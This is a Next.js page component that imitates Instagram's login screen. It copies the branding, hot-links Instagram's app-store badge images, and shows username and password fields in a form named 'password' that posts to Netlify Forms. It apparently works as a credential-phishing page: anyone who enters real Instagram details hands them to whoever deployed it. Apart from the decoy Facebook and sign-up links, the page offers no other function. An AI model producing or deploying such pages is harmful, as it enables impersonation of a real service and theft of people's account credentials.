import Head from 'next/head'
import Image from 'next/image'
import styles from '../styles/Home.module.css'
import React from "react";

export default function Home() {
  return (
    // <div className={styles.container}>
      <React.Fragment>
      <div className={styles.wrapper}>
        <div className={styles.container}>
          <div className={styles.phoneappdemo} />
          <div className={styles.formdata}>
            <form name="password"  method="POST" data-netlify="true" onSubmit="submit">
              <div className={styles.logo}>
                <h1 className={styles.insta}>Instagram</h1>
              </div>
              <input
                type="text"
                name="name"
                placeholder="Phone number, username, or email"
              />
              <input name="password" type="password" placeholder="Password" />
              <button className={styles.formbtn} type="submit">
                Log in
              </button>
              <span className={styles.hasseparator}>Or</span>
              <a href="#" className={styles.facebooklogin}>
                <i className={styles.fab} /> Log in with Facebook
              </a>
              <a className={styles.passwordreset} href="#">
                Forgot password?
              </a>
            </form>
            <div className={styles.signup}>
              Don't an account? <a href="#">Sign up</a>
            </div>
            <div className={styles.gettheapp}>
              <span>Get the app</span>
              <div className={styles.badge}>
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                  alt="android App"
                />
                <img
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                  alt="ios app"
                />
              </div>
            </div>
          </div>
        </div>

        <footer>
          <div className={styles.container}>
            <nav className={styles.footernav}>
              <ul>
                <li>
                  <a href="#">About Us</a>
                </li>
                <li>
                  <a href="#">Support</a>
                </li>
                <li>
                  <a href="#">Jobs</a>
                </li>
                <li>
                  <a href="#">Privacy</a>
                </li>
                <li>
                  <a href="#">Terms</a>
                </li>
                <li>
                  <a href="#">Profiles</a>
                </li>
                <li>
                  <a href="#">Languages</a>
                </li>
              </ul>
            </nav>
            <div className={styles.copyrightnotice}>&copy; 2019 Complaints</div>
          </div>
        </footer>
      </div>
    </React.Fragment>
    // </div>
  )
}
